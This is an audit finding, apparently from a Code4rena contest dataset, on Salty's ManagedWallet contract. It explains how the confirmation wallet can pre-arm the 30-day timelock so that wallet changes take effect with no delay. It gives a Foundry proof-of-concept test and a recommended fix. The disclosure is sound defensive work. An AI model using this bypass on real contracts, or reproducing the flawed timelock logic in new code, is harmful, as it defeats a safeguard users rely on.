# [M] changeWallets

## Summary
Severity: Medium
Contest weight: 0.4473
Dataset id: 20719
Source: https://huggingface.co/datasets/Zaevlad/audit-findings-dataset
Type: audit-finding

## Details
`ManagedWallet.sol` [states](https://github.com/code-423n4/2024-01-salty/blob/main/src/ManagedWallet.sol#L7-L10) that:
    
    // A smart contract which provides two wallet addresses (a main and confirmation wallet) which can be changed using the following mechanism:
    // 1. Main wallet can propose a new main wallet and confirmation wallet.
    // 2. Confirmation wallet confirms or rejects.
    // 3. There is a timelock of 30 days before the proposed mainWallet can confirm the change.

However, the current 30-day wait period can be bypassed.   

The expected order by the protocol is:

1. `proposeWallets()` is called by `mainWallet`.
2. To confirm the proposal, `confirmationWallet` sends at least 0.05 ether and causes the `receive()` function to trigger. This sets the `activeTimelock` to `block.timestamp + TIMELOCK_DURATION` i.e. 30 days into the future.
3. `proposedMainWallet` calls `changeWallets()` after 30 days and the new wallet addresses are set.

To bypass the 30-day limitation, the following flow can be used:

1. Even with no propsal for a change existing, `confirmationWallet` sends at least 0.05 ether and causes the `receive()` function to trigger. This sets the `activeTimelock` to `block.timestamp + TIMELOCK_DURATION` i.e. 30 days into the future.
2. Just as 30 days pass,

   * `proposeWallets()` is called by `mainWallet`
   * Immediately, with no delay whatsoever, `proposedMainWallet` calls `changeWallets()`
3. The new wallet addresses are successfully assigned.

**Impact:** Although the users believe that any changes to wallet address is going to have a timelock of 30 days as promised by the protocol, it really can be bypassed by the current admins/wallet addresses. This breaks the intended functionality implmentation.

## Proof of Concept
Add the following inside `2024-01-salty/src/root_tests/ManagedWallet.t.sol` and run with `COVERAGE="yes" NETWORK="sep" forge test -vv --rpc-url https://rpc.sepolia.org/ --mt test_ManipulateActiveTimeLockBeforeProposingNewWallets`:
    
    function test_ManipulateActiveTimeLockBeforeProposingNewWallets() public {
        // Set up the initial state with main and confirmation wallets
        address initialMainWallet = alice;
        address initialConfirmationWallet = address(0x2222);
        ManagedWallet managedWallet = new ManagedWallet(initialMainWallet, initialConfirmationWallet);

        // Set up the proposed main and confirmation wallets
        address newMainWallet = address(0x3333);
        address newConfirmationWallet = address(0x4444);

        // @audit : Even before any proposal exists, prank as the current confirmation wallet and send ether to start the TIMELOCK_DURATION 
        uint256 sentValue = 0.06 ether;
        vm.prank(initialConfirmationWallet);
        vm.deal(initialConfirmationWallet, sentValue);
        (bool success,) = address(managedWallet).call{value: sentValue}("");
        assertTrue(success, "Confirmation of wallet proposal failed");

        // Warp the blockchain time to the future beyond the active timelock period
        uint256 currentTime = block.timestamp;
        vm.warp(currentTime + TIMELOCK_DURATION);

        // Prank as the initial main wallet to propose the new wallets
        vm.startPrank(initialMainWallet);
        managedWallet.proposeWallets(newMainWallet, newConfirmationWallet);
        vm.stopPrank();

        // @audit : With NO DELAY, immediately prank as the new proposed main wallet which should now be allowed to call changeWallets
        vm.prank(newMainWallet);
        managedWallet.changeWallets();

        // Check that the mainWallet and confirmationWallet state variables are updated
        assertEq(managedWallet.mainWallet(), newMainWallet, "mainWallet was not updated correctly");
        assertEq(managedWallet.confirmationWallet(), newConfirmationWallet, "confirmationWallet was not updated correctly");

        // Check that the proposed wallets and activeTimelock have been reset
        assertEq(managedWallet.proposedMainWallet(), address(0), "proposedMainWallet was not reset");
        assertEq(managedWallet.proposedConfirmationWallet(), address(0), "proposedConfirmationWallet was not reset");
        assertEq(managedWallet.activeTimelock(), type(uint256).max, "activeTimelock was not reset to max uint256");
    }

## Recommendation
Inside `receive()` make sure an active proposal exists:
    
    receive() external payable
        {
        require( msg.sender == confirmationWallet, "Invalid sender" );
        require( proposedMainWallet != address(0), "Cannot manipulate activeTimelock without active proposal" );
    
        // Confirm if .05 or more ether is sent and otherwise reject.
        // Done this way in case custodial wallets are used as the confirmationWallet - which sometimes won't allow for smart contract calls.
        if ( msg.value >= .05 ether )
            activeTimelock = block.timestamp + TIMELOCK_DURATION; // establish the timelock
        else
            activeTimelock = type(uint256).max; // effectively never
        }

Managed wallet has been removed:
<https://github.com/othernet-global/salty-io/commit/5766592880737a5e682bb694a3a79e12926d48a5>
